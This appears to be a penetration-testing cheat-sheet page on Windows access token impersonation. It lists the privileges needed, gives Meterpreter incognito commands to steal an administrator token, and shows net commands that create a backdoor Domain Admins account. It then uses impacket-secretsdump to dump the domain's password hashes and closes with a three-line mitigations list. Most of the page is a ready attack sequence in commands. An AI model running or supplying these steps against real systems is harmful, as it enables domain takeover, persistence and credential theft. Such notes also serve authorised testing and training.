# Access Token Impersionation

## Prerequisites

User privs **required**:

* SeAssignPrimaryToken: allows a user to impersonate tokens
* SeCreateToken: allows a user to create an arbitrary token with administrative privileges
* SeImpersonatePrivilege: allowa a user to create a process under the security context of another user, typically with administrative privileges

```bash
# check privs in meterpreter session
getprivs

# check in cmd
whoami /privs
```



## Impersionation with Metasploit

If we have the privileges to perform this attack, we can use a meterpreter session to load `incognito` module and do the attack.

<pre class="language-bash"><code class="lang-bash"># load incognito module
load incognito

<strong># get token list of the target for impersonation
</strong>list_tokens -u

# copy a token from previusly list and impersonate
impersonate_token TOKEN # ex TOKEN = DOMAIN\Administrator

# get a PID of explorer process
pgrep explorer

# migrate to explorer process PID
migrate PID
</code></pre>



## Post Impersonation strategy

Once we can impersonate a Domain Admin account (we do not know the password), we can add a new user to the Domain and add his to Domain Admin group. In this way we have own domain admin account.

<pre class="language-powershell"><code class="lang-powershell"><strong># create domain user from shell
</strong><strong>net user /add $USER $PASS /domain
</strong>
# add user just created to Domain Admins group
net group "Domain Admins" $USER /ADD /DOMAIN
</code></pre>

For example with this user we can use impecket-secretsdump tool to get hashes from target machine.

```bash
impacket-secretsdump DOMAIN.com/$USER:$PASS@$DC_IP
```



## Mitigations

* Limit user/group token creation permission
* Accout tiering
* Local admin restriction

